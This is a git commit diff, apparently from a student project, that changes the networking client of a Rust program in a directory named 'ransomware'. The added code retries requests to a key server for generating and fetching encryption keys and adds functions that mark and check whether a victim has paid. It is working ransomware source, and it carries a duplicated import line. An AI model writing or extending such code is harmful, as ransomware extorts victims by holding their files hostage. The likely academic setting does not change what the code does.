7ebae3385321222047d9cb0e68a817c988ddf65e
Ivan Vasylets <i.vasylets@student.tue.nl>
2026-01-16 22:14:02 +0100

    trying to deal with git and it's not going well.

--- ransomware/src/networking/client.rs
+++ ransomware/src/networking/client.rs
@@ -1,11 +1,29 @@
 use serde_json::Value;
+use serde_json::Value;
 use sodiumoxide::crypto::box_::{PublicKey, SecretKey};
 
-pub async fn gen_key() -> Result<PublicKey, Box<dyn std::error::Error>> {
-    // let url = "http://172.16.96.1:3000/gen-key";     // ip for VM
-    let url = "http://192.168.241.1:3000/gen-key";
-    // let url = "http://localhost:3000/gen-key";          // for local
+use crate::debug_log;
 
+// single ip address used across the system
+const SERVER_URL: &str = "https://host.containers.internal:3000"; // VM
+// const SERVER_IP: &str = "http://192.168.241.1:3000";           // alternative VM IP
+// const SERVER_IP: &str = "localhost:3000";                      // for local
+
+pub async fn gen_key() -> Result<PublicKey, Box<dyn std::error::Error>> {
+    let url = format!("{}/gen-key", SERVER_URL);
+
+    loop {
+        match gen_key_internal(&url).await {
+            Ok(pk) => return Ok(pk),
+            Err(_) => {
+                debug_log!("failed to connect to server.");
+                tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
+            }
+        }
+    }
+}
+
+async fn gen_key_internal(url: &str) -> Result<PublicKey, Box<dyn std::error::Error>> {
     let client = reqwest::Client::new();
     let response = client.get(url)
                     .send()
@@ -33,10 +51,23 @@ pub async fn gen_key() -> Result<PublicKey, Box<dyn std::error::Error>> {
 }
 
 pub async fn get_key(pk: &PublicKey) -> Result<SecretKey, Box<dyn std::error::Error>> {
-    // let url = "http://172.16.96.1:3000/get-key";        // ip for VM
-    let url = "http://192.168.241.1:3000/get-key";
-    // let url = "http://localhost:3000/get-key";       // for local
+    let url = format!("{}/get-key", SERVER_URL);
 
+    loop {
+        match get_key_internal(&url, pk).await {
+            Ok(sk) => return Ok(sk),
+            Err(_) => {
+                debug_log!("failed to connect to server.");
+                tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
+            }
+        }
+    }
+}
+
+async fn get_key_internal(
+    url: &str,
+    pk: &PublicKey,
+) -> Result<SecretKey, Box<dyn std::error::Error>> {
     let client = reqwest::Client::new();
     let response = client.post(url)
                     .json(pk)
@@ -64,4 +95,30 @@ pub async fn get_key(pk: &PublicKey) -> Result<SecretKey, Box<dyn std::error::Er
         .ok_or("buffer format incorrect")? as SecretKey;
 
     Ok(sk)
+}
+
+pub async fn mark_paid(pk: &PublicKey) -> Result<bool, Box<dyn std::error::Error>> {
+    let url = format!("{}/mark-paid", SERVER_URL);
+    let client = reqwest::Client::new();
+    let response = client.post(url)
+                    .json(pk)
+                    .send()
+                    .await?;
+
+    Ok(response.status().is_success())
+}
+
+//check payment status-client side
+pub async fn check_payment(pk: &PublicKey) -> Result<bool, Box<dyn std::error::Error>> {
+    let url = format!("{}/check-payment", SERVER_URL);
+    let client = reqwest::Client::new();
+    let response = client.post(url)
+                    .json(pk)
+                    .send()
+                    .await?;
+    let body = response.text().await?;
+
+    let json: Value = serde_json::from_str(&body)?;
+    let has_paid = json["has_paid"].as_bool().unwrap_or(false);
+    Ok(has_paid)
 }
